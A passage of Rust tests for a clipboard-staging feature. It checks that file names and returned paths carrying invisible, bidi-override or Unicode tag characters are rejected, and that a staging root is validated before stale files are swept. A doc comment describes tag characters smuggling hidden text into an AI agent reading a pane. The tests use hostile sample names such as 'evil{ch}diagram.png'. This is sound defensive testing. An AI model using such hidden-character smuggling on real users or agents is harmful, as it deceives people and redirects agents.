    /// tag block additionally smuggles readable ASCII past a human's eyes into
    /// whatever agent is reading the pane.
    const INVISIBLE_OR_REORDERING: &[(char, &str)] = &[
        ('\u{202E}', "right-to-left override"),
        ('\u{202D}', "left-to-right override"),
        ('\u{200E}', "left-to-right mark"),
        ('\u{2066}', "left-to-right isolate"),
        ('\u{200B}', "zero-width space"),
        ('\u{FEFF}', "byte order mark"),
        ('\u{00AD}', "soft hyphen"),
        ('\u{2060}', "word joiner"),
        ('\u{180E}', "mongolian vowel separator"),
        ('\u{E0001}', "language tag"),
        ('\u{E0041}', "tag latin capital a"),
        ('\u{E007F}', "cancel tag"),
        ('\u{2028}', "line separator"),
        ('\u{2029}', "paragraph separator"),
        ('\u{00A0}', "no-break space"),
        ('\u{3000}', "ideographic space"),
        ('\u{FFF9}', "interlinear annotation anchor"),
    ];

    #[test]
    fn stage_rejects_invisible_or_reordering_characters_in_the_proposed_filename() {
        let dir = TestDir::new("invisible-name");
        for (ch, name) in INVISIBLE_OR_REORDERING {
            let hostile = format!("evil{ch}diagram.png");
            assert_eq!(
                stage_into(&dir.path, &hostile, PNG_BYTES),
                Err(ClipboardStageFailure::InvalidFilename),
                "{name} (U+{:04X}) must be rejected",
                *ch as u32
            );
        }
        assert!(
            dir.entries().is_empty(),
            "an invisible-character name wrote something: {:?}",
            dir.entries()
        );

        // Positive control: the same stem without the character stages, and so
        // does an ordinary international file name — the guard is the invisible
        // character, not non-ASCII text.
        assert_benign_stage_succeeds(&dir);
        let staged =
            stage_into(&dir.path, "evildiagram.png", PNG_BYTES).expect("plain stem stages");
        fs::remove_file(&staged).expect("clean up");
        let staged = stage_into(&dir.path, "日本語-Ünicode-Ωmega.png", PNG_BYTES)
            .expect("an ordinary international file name stages");
        assert!(staged.exists());
    }

    #[test]
    fn the_returned_path_allowlist_rejects_invisible_or_reordering_characters() {
        for (ch, name) in INVISIBLE_OR_REORDERING {
            let hostile = format!("/tmp/herdr/evil{ch}diagram.png");
            assert!(
                !is_injection_safe_path(&hostile),
                "{name} (U+{:04X}) passed the returned-path allowlist",
                *ch as u32
            );
        }
        // Positive control: the identical shape without the character passes,
        // as does an international path, so the rejections above are the
        // characters and not the surrounding text.
        assert!(is_injection_safe_path("/tmp/herdr/evildiagram.png"));
        assert!(is_injection_safe_path(
            "/tmp/herdr/日本語-Ünicode-Ωmega.png"
        ));
    }

    #[test]
    fn the_filename_and_returned_path_halves_share_one_character_allowlist() {
        // The file-name contract rejects bidi overrides in its own step, with
        // its own rejection reason. The path allowlist must cover them too, or
        // the returned path is checked more weakly than the name it came from.
        for code in [
            0x200Eu32, 0x200F, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068,
            0x2069,
        ] {
            let ch = char::from_u32(code).expect("bidi control is a valid scalar value");
            assert!(
                is_bidi_control(ch),
                "U+{code:04X} is not covered by the file-name bidi step"
            );
            assert!(
                !is_allowed_name_char(ch),
                "U+{code:04X} is rejected by the file-name step but allowed in a returned path"
            );
        }
    }

    #[test]
    fn an_unsafe_staging_root_is_rejected_before_its_contents_are_swept() {
        let dir = TestDir::new("rootsweep");

        let unsafe_root = dir.child(std::ffi::OsStr::new("with space"));
        let unsafe_stale = unsafe_root.join(format!("{FEDERATION_CLIPBOARD_PREFIX}stale.png"));
        write_stale_file(&unsafe_stale);
        assert_eq!(
            stage_into(&unsafe_root, "diagram.png", PNG_BYTES),
            Err(ClipboardStageFailure::StagingUnavailable)
        );
        assert!(
            unsafe_stale.exists(),
            "the 24h sweep ran inside a staging root that was never validated"
        );

        // Positive control: an identical stale file in an acceptable root IS
        // swept, so its survival above is the ordering guard and not a sweep
        // that does nothing.
        let safe_root = dir.child(std::ffi::OsStr::new("acceptable-root"));
        let safe_stale = safe_root.join(format!("{FEDERATION_CLIPBOARD_PREFIX}stale.png"));
        write_stale_file(&safe_stale);
        stage_into(&safe_root, "diagram.png", PNG_BYTES).expect("an acceptable root stages");
        assert!(
            !safe_stale.exists(),
            "the sweep did not run in an acceptable root, so the test above proves nothing"
        );
    }

    /// Writes a file and backdates it past the staging sweep's age limit.
    fn write_stale_file(path: &Path) {
        let mut file = fs::File::create(path).expect("create stale file");
        file.write_all(PNG_BYTES).expect("write stale file");
        let old = SystemTime::now() - Duration::from_secs(48 * 60 * 60);
        file.set_times(fs::FileTimes::new().set_accessed(old).set_modified(old))
            .expect("backdate stale file");
    }
}
